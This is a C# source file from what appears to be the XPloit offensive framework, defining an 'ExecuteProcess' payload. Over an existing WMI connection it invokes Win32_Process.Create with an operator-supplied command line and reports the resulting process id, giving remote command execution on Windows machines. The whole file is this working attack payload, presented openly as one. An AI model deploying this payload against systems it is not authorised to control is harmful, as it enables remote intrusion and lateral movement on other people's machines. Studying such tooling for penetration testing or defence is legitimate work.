using Auxiliary.Multi.Windows;
using System;
using System.Management;
using XPloit.Core;
using XPloit.Core.Attributes;
using XPloit.Core.Enums;

namespace Payloads.Multi.Windows.WMI.Action
{
    public class ExecuteProcess : Payload, WMIManager.IWMIPayload
    {
        #region Configure
        public override string Author { get { return "Fernando Díaz Toledano"; } }
        public override string Description { get { return "Execute a process in WMI"; } }
        public override Reference[] References
        {
            get
            {
                return new Reference[] { new Reference(EReferenceType.URL, "https://msdn.microsoft.com/en-us/library/windows/desktop/aa394372(v=vs.85).aspx") };
            }
        }
        #endregion

        #region Properties
        [ConfigurableProperty(Required = true, Description = "Command line parameter")]
        public string CommandLine { get; set; }

        public bool Run(ManagementScope connection)
        {
            ObjectGetOptions objectGetOptions = new ObjectGetOptions();
            ManagementPath managementPath = new ManagementPath("Win32_Process");
            using (ManagementClass processClass = new ManagementClass(connection, managementPath, objectGetOptions))
            {
                using (ManagementBaseObject inParams = processClass.GetMethodParameters("Create"))
                {
                    inParams["CommandLine"] = CommandLine;
                    using (ManagementBaseObject outParams = processClass.InvokeMethod("Create", inParams, null))
                    {
                        uint ret = (uint)outParams["returnValue"];
                        if (ret != 0)
                        {
                            throw new Exception("Error while starting process '" + CommandLine +
                                "' creation returned an exit code of " + outParams["returnValue"]);
                        }

                        WriteInfo("Process executed", outParams["processId"].ToString(), ConsoleColor.Green);
                        return true;
                    }
                }
            }
        }
        #endregion
    }
}